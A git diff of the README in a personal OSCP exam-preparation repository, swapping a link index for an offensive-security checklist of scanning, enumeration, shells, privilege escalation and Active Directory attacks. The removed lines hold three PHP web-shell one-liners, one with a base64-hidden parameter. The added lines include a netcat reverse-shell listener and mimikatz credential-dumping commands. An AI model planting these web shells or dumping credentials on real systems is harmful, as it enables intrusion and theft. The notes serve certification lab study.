@@ -1,45 +1,91 @@
-# Repository for my OSCP preparation
+## 1. Discovery
 
-|Topic|Link|
+### 1.1. Port scan
+
+|Scan|Command|
 |---|---|
-|cURL|<https://github.com/joetanx/oscp/blob/main/curl.md>|
-|Enumerating target|<https://github.com/joetanx/oscp/blob/main/enumeration.md>|
-|Getting shells and transferring files to/from target|<https://github.com/joetanx/oscp/blob/main/connect-transfer.md>|
-|Port forwarding|<https://github.com/joetanx/oscp/blob/main/port-forwarding.md>|
-|SQLi labs|<https://github.com/joetanx/oscp/blob/main/sqli-labs.md>|
-|DVWA - SQL injection|<https://github.com/joetanx/oscp/blob/main/dvwa-sqli.md>|
-|Attacking Active Directory|<https://github.com/joetanx/oscp/blob/main/attacking-active-directory.md>|
-|Windows Privilege Escalation|<https://github.com/joetanx/oscp/blob/main/winprivesc.md>|
-|References|<https://github.com/joetanx/oscp/blob/main/references.md>|
+|Initial network sweep|`nmap -sn $TARGET_RANGE`|
+|TCP |`nmap -Pn -sT -A $TARGET_IP`|
+|UDP |`nmap -sU -A $TARGET_IP`|
 
-# Experience Tracking
+## 2. Enumeration
 
-## SQL Injection
+### 2.1. FTP `21`
 
-<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/dc-9.md>
+lftp find
 
-<https://github.com/joetanx/oscp/blob/main/dvwa-sqli.md>
+### 2.2. HTTP/HTTPS `80`/`443`/`8080`
 
-<https://github.com/joetanx/oscp/blob/main/sqli-labs.md>
+dirb
 
-## Googling for Exploits
+gobuster
 
-<https://github.com/joetanx/oscp/blob/0f6b0a8a5f387bf0decbd6093807f470f9c7e1e8/practice/itsl/2021-10-04-mousekatool2.md>
+worldlists
 
-<https://github.com/joetanx/oscp/blob/main/practice/itsl/2021-11-22-Checks.md>
+### 2.3. SMB `139`/`445`
 
-<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md>
+enum4linux
 
-## Web Shells
+### 2.4. LDAP `389`
 
-|   |   |
+## 3. Shells
+
+### 3.1. Listener
+
+```console
+rlwrap nc -nlvp 4444
+```
+
+### 3.X. Various reverse shells
+
+https://highon.coffee/blog/reverse-shell-cheat-sheet/
+
+### 3.X. Web shells
+
+### 3.X. Payloads
+
+### 3.X. Windows direct connection
+
+evil-winrm
+impacket-psexec
+
+### 3.X. Upgrade to Full TTY
+
+## 4. File transfers
+
+## 5. Port forwarding
+
+### 5.1. SSH port forwarding
+
+### 5.2. Chisel
+
+## 6. Linux privilege escalation
+
+https://github.com/carlospolop/PEASS-ng/releases
+
+## 7. Windows privilege escalation
+
+https://raw.githubusercontent.com/itm4n/PrivescCheck/master/PrivescCheck.ps1
+
+https://github.com/carlospolop/PEASS-ng/releases
+
+## 8. Active Directory
+
+AS-REP Roasting
+
+mimikatz lsadump::sam, lsadump::lsa /patch, sekurlsa::logonpasswords
+
+Pass the hash: evil-winrm, impacket-psexec
+
+Kerberoasting
+
+Golden Ticket
+
+## 9. Exam proofs
+
+|OS|Command|
 |---|---|
-|`<?php echo passthru($_GET['k']);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2021-10-24-Dealer313.md>|
-|`<?php system($_GET[base64_decode('Y21k')]);?>`|<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-17-Vulndc2.md>|
-|`<?php echo passthru($_GET['cmd']); ?>`|<https://github.com/joetanx/oscp/blob/main/practice/vulnhub/digitalworld.local-joy.md>|
+|Linux|`hostname`<br>`cat /path/to/flag/proof.txt`<br>`ifconfig`|
+|Windows|`hostname`<br>`type C:\path\to\flag\proof.txt`<br>`ipconfig`|
 
-## Active Directory
-
-<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-10-VulnDC.md>
-
-<https://github.com/joetanx/oscp/blob/main/practice/itsl/2022-01-17-Vulndc2.md>
+## 10. References
